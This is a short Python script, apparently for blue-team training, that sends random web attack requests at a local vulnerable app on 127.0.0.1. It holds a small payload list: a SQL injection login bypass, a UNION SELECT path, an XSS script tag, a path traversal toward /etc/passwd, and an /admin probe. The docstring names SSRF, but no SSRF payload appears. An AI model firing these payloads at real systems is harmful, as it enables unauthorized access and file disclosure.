"""Attack simulator — fires SQLi, XSS, SSRF at the vulnerable app for blue team to detect."""
import requests, time, random
TARGET = "http://127.0.0.1:5906"
ATTACKS = [
    ("POST","/login",{"user":"admin' OR '1'='1","pass":"x"}),
    ("POST","/login",{"user":"<script>alert(1)</script>","pass":"x"}),
    ("GET","/api/users/1 UNION SELECT 1,2,3",None),
    ("POST","/reset-password",{"email":"../../../etc/passwd"}),
    ("GET","/admin",None),
]
def simulate(iterations=10):
    for i in range(iterations):
        method, path, data = random.choice(ATTACKS)
        try:
            if method == "GET": requests.get(TARGET+path, timeout=5)
            else: requests.post(TARGET+path, data=data, timeout=5)
        except: pass
        time.sleep(random.uniform(0.5, 2.0))
    print(f"Simulated {iterations} attacks against {TARGET}")
if __name__ == "__main__": simulate()
